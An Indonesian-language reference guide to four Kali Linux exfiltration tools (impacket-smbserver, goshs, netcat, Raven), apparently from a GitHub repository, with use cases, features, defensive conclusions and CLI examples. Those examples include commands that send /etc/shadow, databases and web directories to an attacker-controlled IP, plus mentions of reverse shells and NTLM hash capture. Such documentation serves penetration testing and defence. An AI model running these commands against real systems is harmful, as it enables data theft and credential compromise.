# [Kali Linux Categories](https://github.com/kiyanami/Kali-Linux-Category/blob/main/Kali%20Linux%20Category.md)
# Exviltration
# 🛠️ Exfiltration Tools - Kali Linux 
Dokumentasi ini berisi penjelasan mendalam mengenai berbagai perangkat lunak ekstraksi data (*Exfiltration*) dan pemindahan informasi dari sistem target yang terdapat dalam distribusi **Kali Linux**.

## 📋 Daftar Isi

1. [Impacket-smbserver](#1-impacket-smbserver)
2. [Goshs (Go Simple HTTP(s) Server)](#2-goshs-go-simple-https-server)
3. [Netcat (netcat)](#3-netcat-netcat)
4. [Raven](#4-raven)

---

## 1. Impacket-smbserver

> **Ringkasan:** Bagian dari framework skrip Python milik Impacket. Alat ini digunakan untuk membuat peladen SMB (*Server Message Block*) instan di komputer penyerang. Di dalam skenario eksfiltrasi, komputer target yang telah disusupi dapat diperintahkan untuk menyalin berkas rahasia langsung ke folder jaringan palsu tersebut menggunakan perintah bawaan sistem operasi target.

### 📄 Deskripsi Perangkat Lunak

`impacket-smbserver` adalah sebuah utilitas peladen protokol SMB (*Server Message Block*) mandiri berbasis *open-source* yang dikembangkan menggunakan bahasa pemrograman Python sebagai bagian dari rangkaian pustaka jaringan Impacket. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan secara khusus ke dalam kategori **Exfiltration** (bersama paket induknya `impacket-scripts` pada kategori *Defense Evasion*, *Lateral Movement*, dan *Command and Control*).

Secara arsitektural, `impacket-smbserver` mengimplementasikan spesifikasi protokol SMBv1 dan SMBv2 secara langsung dalam ruang pengguna (*user-space*) tanpa memerlukan konfigurasi sistem operasi yang kompleks seperti layanan daemon Samba (`smbd`). Instrumen ini memungkinkan penguji penetrasi menginisiasi direktori berbagi pakai jaringan (*network file share*) secara instan dari terminal Kali Linux hanya dengan satu baris perintah, sehingga mesin target berbasis Microsoft Windows dapat membaca, menulis, maupun mengeksekusi berkas secara langsung melalui protokol jaringan bawaannya (`\\<IP_Kali>\<Nama_Share>`).

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

* **Eksfiltrasi Data Tanpa Agen Tambahan (*Agentless Data Exfiltration*):** Membantu penguji penetrasi (*penetration tester*) mengeluarkan data sensitif—seperti berkas basis data, dokumen rahasia, atau berkas *memory dump* proses `lsass.exe`—dari mesin target Windows ke mesin Kali Linux menggunakan perintah salin bawaan Windows (`copy`, `xcopy`, `robocopy`, atau `Move-Item`) tanpa harus memasang klien FTP/HTTP eksternal.

* **Distribusi dan Eksekusi Muatan Jarak Jauh (*Remote Payload Delivery & In-Memory Execution*):** Digunakan oleh praktisi Red Team untuk menyajikan berkas biner audit (seperti `WinPEAS.exe` atau skrip PowerShell) agar dapat dieksekusi langsung oleh target dari jalur UNC (*Universal Naming Convention*) jaringan tanpa menyentuh cakram keras lokal target.

* **Pencegatan Hash Otentikasi Jaringan (*NetNTLMv1/v2 Hash Capture*):** Berfungsi sebagai perangkap pasif (*rogue SMB listener*) untuk menangkap hash tantangan-respons NetNTLMv1/v2 yang dikirimkan secara otomatis oleh klien Windows ketika dipaksa mengakses jalur berbagi jaringan milik penguji (misalnya melalui eksploitasi *File Inclusion*, injeksi jalur UNC pada dokumen Office/PDF, atau kerentanan aplikasi web).

* **Evaluasi Penyaringan Lalu Lintas Keluar SMB (*Blue Team Egress Filtering Auditing*):** Memungkinkan tim pertahanan menguji efektivitas aturan firewall perimeter dan *host-based firewall* dalam memblokir koneksi protokol SMB keluar (port TCP 445) menuju alamat IP eksternal maupun segmen jaringan tidak tepercaya.

### ⚙️ Fungsi Teknis (Functionality)

* **Instansiasi Direktori Berbagi Pakai Secara Instan (`<shareName> <sharePath>`):** Memetakan direktori lokal mana pun pada sistem berkas Kali Linux menjadi sumber daya jaringan SMB aktif pada antarmuka jaringan penguji secara *real-time* tanpa memerlukan penyuntingan berkas konfigurasi sistem (`smb.conf`) maupun hak akses instalasi layanan permanen.

* **Dukungan Protokol Modern SMBv2 (`-smb2support`):** Menyediakan kompatibilitas penuh dengan spesifikasi protokol SMBv2 yang diwajibkan secara bawaan oleh sistem operasi Windows 10, Windows 11, dan Windows Server versi modern (yang secara *default* menonaktifkan protokol usang SMBv1 demi alasan keamanan).

* **Kontrol Otentikasi dan Akses Anonim (`-username` & `-password`):** Mengakomodasi dua mode akses, yaitu mode akses tamu/anonim (*anonymous guest access*) untuk kemudahan interaksi dari klien lama, serta mode terautentikasi yang mewajibkan kombinasi nama pengguna dan kata sandi spesifik guna memenuhi kebijakan keamanan *Windows Guest Access Restriction* pada sistem operasi Windows modern.

* **Pencatatan dan Penangkapan Hash Otentikasi Otomatis (`-outputfile`):** Secara otomatis mencatat seluruh permintaan jabat tangan otentikasi NTLM yang masuk ke konsol maupun ke dalam berkas log statis dalam format yang langsung kompatibel dengan mesin pemecah kata sandi luring seperti Hashcat (`-m 5600`) dan John the Ripper (`netntlmv2`).

* **Kustomisasi Parameter Jaringan dan Komentar Layanan (`-ip`, `-port`, `-comment`, `-debug`):** Mengizinkan penguji mengikat peladen SMB ke alamat IP antarmuka spesifik (misalnya antarmuka VPN `tun0` atau `tap` ligolo), mengubah port mendengarkan standar, serta menampilkan log diagnostik tingkat paket (*debug mode*) untuk mengamati setiap operasi pembacaan dan penulisan berkas oleh klien target.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menjalankan SMB server anonim dengan dukungan SMBv2
impacket-smbserver share /tmp/exfil_folder -smb2support

# 2. Menjalankan SMB server terautentikasi (username & password)
impacket-smbserver share /tmp/exfil_folder -smb2support -username admin -password Password123!

# 3. Perintah eksfiltrasi yang dieksekusi di mesin Windows target
copy C:\Secret\data.xlsx \\192.168.1.10\share\data.xlsx
```

> 💡 **Kesimpulan:**
> Secara akademis, `impacket-smbserver` mendemonstrasikan bagaimana integrasi protokol berbagi berkas asli (*native file sharing protocols*) pada sistem operasi modern dapat dimanfaatkan sebagai kanal eksfiltrasi data dan distribusi muatan yang sangat efisien tanpa memerlukan perangkat lunak tambahan di sisi target. Keberadaannya di dalam kategori Exfiltration Kali Linux menegaskan bahwa pertahanan jaringan korporat tidak cukup hanya memblokir koneksi SMB masuk; organisasi wajib menerapkan *Egress SMB Filtering* (memblokir lalu lintas keluar pada port TCP 445 dan 139 di firewall perimeter), menonaktifkan dukungan protokol usang SMBv1, memblokir akses tamu (*insecure guest logons*) pada klien Windows melalui Group Policy, serta memantau koneksi jaringan keluar yang berasal dari proses sistem tidak lazim.

---

## 2. Goshs (Go Simple HTTP(s) Server)

> **Ringkasan:** Sebuah peladen web instan berbasis bahasa Go yang sangat ringan dan mendukung fitur HTTPS serta autentikasi dasar. Alat ini sering dijalankan di mesin target atau mesin penyerang untuk membuat direktori berkas dapat diakses via web, memudahkan pengunduhan data sensitif langsung dari peramban secara aman.

### 📄 Deskripsi Perangkat Lunak

`goshs` (*Go Simple HTTP(s) Server*) adalah sebuah utilitas peladen web (*web server*) sementara dan sarana transfer berkas dua arah berbasis *open-source* yang dikembangkan menggunakan bahasa pemrograman Go (Golang). Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Exfiltration**.

Secara arsitektural, `goshs` dirancang sebagai pengganti modern berkinerja tinggi bagi peladen web minimalis klasik seperti `python3 -m http.server`. Berbeda dengan peladen HTTP bawaan Python yang hanya mendukung pengunduhan satu arah tanpa enkripsi dan tanpa mekanisme unggah berkas, `goshs` menyediakan peladen HTTP/HTTPS terenkripsi secara instan, antarmuka pengguna web (*web UI*) interaktif dengan dukungan *drag-and-drop*, protokol WebDAV, serta fitur eksekusi perintah jarak jauh secara langsung dari satu biner portabel.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

* **Eksfiltrasi Data Terenkripsi (*Encrypted Data Exfiltration*):** Membantu penguji penetrasi (*penetration tester*) mengeluarkan berkas sensitif dari mesin target menuju mesin Kali Linux menggunakan protokol standar HTTP/HTTPS (melalui metode POST/PUT, perintah `curl`, `wget`, atau antarmuka web) yang kerap diizinkan melintasi firewall korporat.

* **Distribusi Muatan dan Alat Audit Pasca-Eksploitasi (*Payload & Tool Staging*):** Digunakan oleh praktisi Red Team untuk menyajikan berkas biner audit (seperti LinPEAS, WinPEAS, Chisel, atau skrip PowerShell) secara cepat dan terlindungi kata sandi ke mesin target selama fase pasca-eksploitasi.

* **Integrasi Berbagi Pakai WebDAV untuk Lingkungan Windows:** Memungkinkan mesin target Windows berinteraksi secara langsung dengan direktori Kali Linux melalui jalur UNC berbasis WebDAV (`\\<IP_Kali>@<Port>\DavWWWRoot\`), sangat berguna ketika protokol SMB (port 445) diblokir oleh aturan firewall jaringan.

* **Evaluasi Pemantauan Lalu Lintas Keluar dan DLP (*Blue Team Egress & DLP Auditing*):** Memungkinkan tim pertahanan menguji efektivitas sistem *Data Loss Prevention* (DLP), Web Proxy, dan *Intrusion Detection System* (IDS) dalam mendeteksi unggahan berkas tidak sah maupun lalu lintas sertifikat TLS yang ditandatangani sendiri (*self-signed certificates*).

### ⚙️ Fungsi Teknis (Functionality)

* **Enkripsi TLS/HTTPS Otomatis dan Kustom (`-s`, `-sc`, `-c`, `-k`):** Mampu mengaktifkan protokol HTTPS secara instan dengan membuat sertifikat kriptografis X.509 yang ditandatangani sendiri (*self-signed certificate* `-sc`) di dalam memori tanpa memerlukan konfigurasi OpenSSL manual, maupun memuat sertifikat valid (seperti Let's Encrypt) untuk menyamarkan lalu lintas transfer.

* **Transfer Berkas Dua Arah dan Pencatatan Isi di Terminal (`-u`, `-p`, `-po`):** Mendukung pengunduhan dan pengunggahan berkas baik melalui antarmuka web modern (*drag-and-drop upload* dan unduh massal berformat `.zip`) maupun melalui perintah baris perintah (`curl -F` atau `curl -X POST`). Fitur `-p` (*print post*) bahkan dapat mencetak data eksfiltrasi berbasis teks langsung ke konsol terminal tanpa menyimpannya ke cakram keras.

* **Dukungan Protokol WebDAV Terintegrasi (`-w`):** Mengaktifkan ekstensi WebDAV (*Web Distributed Authoring and Versioning*) di atas peladen HTTP/HTTPS, memungkinkan sistem operasi klien melakukan operasi pembacaan, penulisan, hingga eksekusi berkas secara langsung layaknya direktori jaringan lokal.

* **Mekanisme Kontrol Akses dan Otentikasi (`-b`, `-c`, `-ro`, `-uo`):** Menyediakan perlindungan keamanan berlapis agar peladen sementara penguji tidak disalahgunakan oleh pihak lain di jaringan yang sama, meliputi *HTTP Basic Authentication* (`-b user:pass`), otentikasi berbasis sertifikat klien (mTLS), mode hanya-baca (*read-only* `-ro`), serta mode hanya-unggah (*upload-only / drop-box mode* `-uo`) yang menyembunyikan daftar berkas pada peladen.

* **Antarmuka Web Interaktif dengan Penyunting Kode dan Eksekusi Perintah (`-c` / `--cli`):** Dilengkapi dengan antarmuka web yang kaya fitur, mencakup penampil/penyunting teks dan kode sumber secara langsung di peramban, sistem papan klip bersama (*shared clipboard*) untuk bertukar potongan skrip *one-liner* antar-mesin, serta konsol eksekusi perintah jarak jauh opsional (`--cli`).

* **Pembuatan Perintah Unduh Otomatis (*Automated One-Liner Download Generator*):** Menyediakan tombol bantu di dalam antarmuka web yang secara otomatis menyusun sintaks perintah unduh siap salin (untuk `curl`, `wget`, PowerShell `Invoke-WebRequest`, dan `certutil`) lengkap dengan alamat IP antarmuka dan port aktif peladen.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menjalankan goshs HTTPS dengan self-signed certificate & basic auth
goshs -s -sc -b admin:Password123! -i eth0 -p 8443

# 2. Menjalankan mode WebDAV dan mengizinkan upload berkas
goshs -w -u -p 8080

# 3. Eksfiltrasi dari target Linux menggunakan curl ke peladen goshs
curl -F "file=@/etc/shadow" https://192.168.1.10:8443/upload -k -u admin:Password123!
```

> 💡 **Kesimpulan:**
> Secara akademis, `goshs` merepresentasikan evolusi utilitas transfer data dalam keamanan siber yang menggabungkan kemudahan penggunaan peladen web *ad-hoc* dengan standar keamanan komunikasi modern (enkripsi TLS, otentikasi akses, dan dukungan WebDAV). Keberadaannya di dalam kategori Exfiltration Kali Linux menegaskan bahwa kontrol keamanan perimeter yang hanya mengandalkan pemblokiran port non-standar tidak mampu mencegah kebocoran data apabila lalu lintas keluar (HTTP/HTTPS pada port 80 dan 443) tidak diawasi; organisasi wajib menerapkan *SSL/TLS Inspection* pada proksi keluar (*egress web proxy*), pemantauan anomali volume unggahan (*outbound data transfer anomalies*), serta kebijakan *Data Loss Prevention* (DLP) yang ketat.

---

## 3. Netcat (netcat)

> **Ringkasan:** Perkakas jaringan klasik serbaguna. Untuk kebutuhan eksfiltrasi data sederhana, Netcat dapat dipasangkan di kedua sisi (target dan penyerang) untuk membuka pipa koneksi mentah (*raw network pipe*) TCP/UDP, lalu mengalirkan isi berkas teks atau arsip zip secara langsung melewati porta tertentu.

### 📄 Deskripsi Perangkat Lunak

Netcat (`netcat` atau disingkat `nc`) adalah sebuah utilitas jaringan berbasis baris perintah (*command-line interface* / CLI) yang dikembangkan dalam bahasa pemrograman C untuk membaca dan menulis data secara langsung melintasi koneksi jaringan menggunakan protokol TCP (*Transmission Control Protocol*) maupun UDP (*User Datagram Protocol*). Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam dua kategori strategis, yaitu **Command and Control** (secara spesifik pada sub-kategori *Non-Application Layer Protocol*) dan **Exfiltration**.

Secara arsitektural, Netcat dijuluki sebagai *"TCP/IP Swiss Army Knife"* karena kemampuannya mengabstraksi komunikasi soket jaringan pada Lapisan Transpor (Layer 4) model OSI. Instrumen ini menghubungkan aliran *input* standar (`stdin`) dan *output* standar (`stdout`) dari proses sistem operasi secara langsung ke soket jaringan mentah, tanpa menambahkan header protokol lapisan aplikasi apa pun. Desainnya yang sangat minimalis dan ringan menjadikannya komponen standar pada hampir seluruh sistem operasi berbasis Unix/Linux.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

* **Pembangunan Saluran Kendali Jarak Jauh (*Bind & Reverse Shells*):** Membantu penguji penetrasi (*penetration tester*) membangun sesi eksekusi perintah jarak jauh setelah mengeksploitasi celah *Remote Code Execution* (RCE), baik dengan menangkap koneksi keluar dari target (*reverse shell*) maupun menghubungkan diri ke port pendengar yang dibuka pada target (*bind shell*).

* **Eksfiltrasi dan Transfer Berkas Lintas Sistem (*Raw Socket Data Exfiltration*):** Digunakan untuk memindahkan berkas biner, alat audit pasca-eksploitasi, maupun mengekstrak data sensitif dari sistem yang telah terkompromi secara langsung melalui aliran byte TCP/UDP tanpa memerlukan peladen FTP, HTTP, atau SMB.

* **Inspeksi Protokol Manual dan Pengambilan Banner (*Banner Grabbing & Protocol Debugging*):** Memungkinkan analis keamanan berinteraksi secara mentah dengan layanan berbasis teks (seperti HTTP, SMTP, POP3, FTP, atau Redis) untuk mengidentifikasi versi perangkat lunak (*service fingerprinting*) dan menguji perilaku respons protokol secara manual.

* **Evaluasi Aturan Firewall dan Pemantauan Lalu Lintas Keluar (*Blue Team Egress Auditing*):** Berfungsi sebagai instrumen pengujian cepat bagi administrator jaringan untuk memverifikasi apakah aturan firewall perimeter berhasil memblokir koneksi keluar pada port sembarang (*egress filtering*).

### ⚙️ Fungsi Teknis (Functionality)

* **Operasi Mode Klien dan Mode Pendengar (`-l` & `-p`):** Menyediakan fleksibilitas komunikasi dua arah; dalam mode klien (`nc <IP> <Port>`), Netcat menginisiasi jabat tangan tiga arah (*TCP 3-way handshake*) ke host tujuan, sedangkan dalam mode pendengar (`nc -lvnp <Port>`), Netcat mengikat (*bind*) port lokal tertentu untuk menunggu dan menerima koneksi masuk.

* **Pengaitan Program dan Eksekusi Shell (`-e` & `-c`):** Pada varian Netcat tradisional (`nc.traditional` yang tersedia di Kali Linux), opsi `-e` memungkinkan pengaitan langsung soket jaringan ke berkas eksekusi lokal (seperti `/bin/bash` atau `cmd.exe`), sehingga setiap masukan dari jaringan langsung diproses sebagai perintah sistem operasi.

* **Pengalihan Aliran Berkas dan Pipa Data (*Standard I/O File Redirection*):** Memanfaatkan operator pengalihan shell (`<` dan `>`) untuk mengalirkan isi berkas biner langsung ke soket jaringan pada mesin pengirim dan menyimpannya kembali menjadi berkas utuh pada mesin penerima (misalnya `nc -lvnp 4444 > output.zip`).

* **Pemindaian Port Tanpa Muatan (*Zero-I/O Port Scanning* `-z`):** Menyediakan mode *zero-I/O* yang menutup koneksi segera setelah jabat tangan TCP berhasil dilakukan tanpa mengirimkan data apa pun, memungkinkan pemindaian status port TCP atau UDP secara cepat dan ringan.

* **Kontrol Resolusi DNS, Timeout, dan Protokol UDP (`-n`, `-w`, `-u`, `-v`):** Mengakomodasi penonaktifan resolusi DNS (`-n`) untuk mempercepat eksekusi dan mencegah kebocoran kueri DNS, pengaturan batas waktu koneksi (`-w`), pengiriman datagram UDP mentah (`-u`), serta keluaran diagnostik terperinci (`-v`).

### 💻 Contoh Penggunaan CLI

```bash
# 1. Mesin Kali Linux (Receiver) membuka listener untuk menerima file eksfiltrasi
nc -lvnp 4444 > exfiltrated_database.db

# 2. Mesin Target (Sender) mengirimkan file melalui socket TCP mentah
nc -nv 192.168.1.10 4444 < database.db

# 3. Eksfiltrasi cepat folder terkompresi via tar pipeline
# Di penerima (Kali):
nc -lvnp 4444 | tar -xvf -
# Di pengirim (Target):
tar -cvf - /var/www/html | nc -nv 192.168.1.10 4444
```

> 💡 **Kesimpulan:**
> Secara akademis, Netcat merepresentasikan fondasi pemrograman soket jaringan (*Berkeley Sockets*) dalam bentuknya yang paling murni dan serbaguna, membuktikan bahwa saluran komunikasi *Command and Control* maupun eksfiltrasi data dapat dibangun secara efektif hanya dengan memanfaatkan primitif protokol Lapisan Transpor (TCP/UDP). Keberadaannya di Kali Linux menegaskan bahwa keamanan infrastruktur sistem operasi menuntut penerapan kebijakan *Egress Filtering* yang ketat pada firewall perimeter untuk memblokir koneksi keluar tidak sah, penghapusan biner Netcat versi berbahaya (yang mendukung opsi `-e`) dari peladen produksi, serta pemantauan anomali soket jaringan dan proses shell oleh sistem EDR/IDS.

---

## 4. Raven

> **Ringkasan:** Sebuah perkakas pemindahan data khusus yang dirancang untuk membantu mengotomatisasi pengiriman berkas dari jarak jauh dengan opsi penyamaran tertentu agar tidak memicu deteksi sistem pemantauan jaringan.

### 📄 Deskripsi Perangkat Lunak

Raven (`raven`) adalah sebuah utilitas layanan web sementara (*lightweight file upload/exfiltration HTTP server*) berbasis *open-source* yang dikembangkan menggunakan bahasa pemrograman Python 3. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Exfiltration**.

Secara arsitektural, Raven dirancang untuk mengatasi keterbatasan modul peladen web bawaan Python (`python3 -m http.server`) yang secara *default* hanya mendukung permintaan pengunduhan (GET) dan tidak memiliki mekanisme penanganan unggahan berkas (POST/PUT). Raven beroperasi sebagai peladen HTTP minimalis yang secara khusus mendengarkan permintaan masuk untuk menerima, memarsing, dan menyimpan berkas biner maupun teks yang dikirimkan oleh mesin target ke direktori lokal penguji di Kali Linux tanpa memerlukan instalasi peladen web produksi yang kompleks seperti Apache atau Nginx.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

* **Eksfiltrasi Artefak Pasca-Eksploitasi (*Post-Exploitation Data Exfiltration*):** Membantu penguji penetrasi (*penetration tester*) mengeluarkan data sensitif—seperti berkas basis data, kunci privat SSH, konfigurasi aplikasi, atau berkas *memory dump* proses sistem—dari mesin target ke mesin Kali Linux melalui protokol standar HTTP yang umumnya diizinkan melintasi firewall keluar (*egress firewall*).

* **Transfer Berkas Lintas Platform Tanpa Klien Khusus (*Agentless Cross-Platform Transfer*):** Digunakan ketika akses ke target hanya berupa sesi terminal teks dasar (*reverse shell*) dan alat transfer lain (seperti `scp`, `smbclient`, atau `nc`) tidak tersedia atau diblokir, sehingga target cukup memanfaatkan utilitas bawaan sistem operasi seperti `curl`, `wget`, atau PowerShell `Invoke-RestMethod` untuk mengirimkan berkas.

* **Evaluasi Sistem Pencegahan Kebocoran Data (*Blue Team DLP & Egress Monitoring Auditing*):** Memungkinkan analis pertahanan menguji efektivitas aturan *Data Loss Prevention* (DLP), Web Proxy, dan *Intrusion Detection System* (IDS) dalam mendeteksi transmisi unggahan HTTP POST tidak terenkripsi menuju alamat IP eksternal non-standar.

### ⚙️ Fungsi Teknis (Functionality)

* **Penanganan Permintaan HTTP POST Multipart dan Mentah (*HTTP POST Handler*):** Mampu menerima serta menguraikan data unggahan baik yang dikirimkan menggunakan format formulir standar `multipart/form-data` (seperti melalui `curl -F "file=@data.zip"`) maupun aliran muatan biner mentah, lalu merekonstruksinya kembali secara utuh di direktori tujuan.

* **Pengikatan Antarmuka Jaringan dan Port Spesifik (`<ip>` & `<port>`):** Mengizinkan penguji menentukan secara eksplisit alamat IP antarmuka jaringan lokal yang digunakan (misalnya alamat IP VPN `tun0` atau antarmuka lokal `eth0`) beserta nomor port mendengarkan (*listening port*) guna mengisolasi layanan agar tidak terekspos pada antarmuka publik yang tidak diinginkan.

* **Penentuan Direktori Penyimpanan Terisolasi (`--upload-folder` / `-o`):** Menyediakan pengaturan jalur direktori spesifik tempat berkas hasil eksfiltrasi disimpan, dilengkapi mekanisme pencegahan penimpaan berkas secara tidak sengaja maupun sanitasi nama berkas dasar untuk menjaga keamanan mesin penguji selama sesi audit berlangsung.

* **Pencatatan Telemetri Koneksi Secara Real-Time (*Verbose Request Logging*):** Menampilkan informasi metadata setiap permintaan HTTP yang masuk secara langsung di konsol terminal—meliputi alamat IP sumber target, stempel waktu (*timestamp*), metode HTTP, User-Agent, ukuran berkas, serta status keberhasilan penyimpanan—untuk mempermudah verifikasi proses eksfiltrasi.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menjalankan peladen Raven pada port 8080 dan menyimpan berkas ke /tmp/loot
raven -i 192.168.1.10 -p 8080 -o /tmp/loot

# 2. Perintah eksfiltrasi dari mesin target menggunakan curl
curl -X POST -F "file=@sensitive_config.json" http://192.168.1.10:8080/upload

# 3. Perintah eksfiltrasi dari mesin target Windows menggunakan PowerShell
Invoke-RestMethod -Uri "http://192.168.1.10:8080/upload" -Method Post -InFile "C:\StolenData.zip"
```

> 💡 **Kesimpulan:**
> Secara akademis, Raven merepresentasikan solusi pragmatis terhadap asimetri aliran data pada pengujian keamanan berbasis protokol web: sementara pengunduhan muatan ke target dapat dilakukan dengan peladen HTTP statis biasa, penarikan bukti (*exfiltration*) dari target membutuhkan titik akhir yang mampu memproses metode pengiriman data dua arah. Keberadaannya di dalam kategori Exfiltration Kali Linux menegaskan bahwa pertahanan perimeter modern wajib menerapkan pengawasan ketat terhadap lalu lintas HTTP keluar (*outbound HTTP egress*), membatasi koneksi langsung dari peladen internal menuju alamat IP tidak terdaftar melalui proksi web terautentikasi, serta memantau anomali penggunaan utilitas transfer bawaan sistem (seperti `curl` atau PowerShell) oleh akun layanan web.
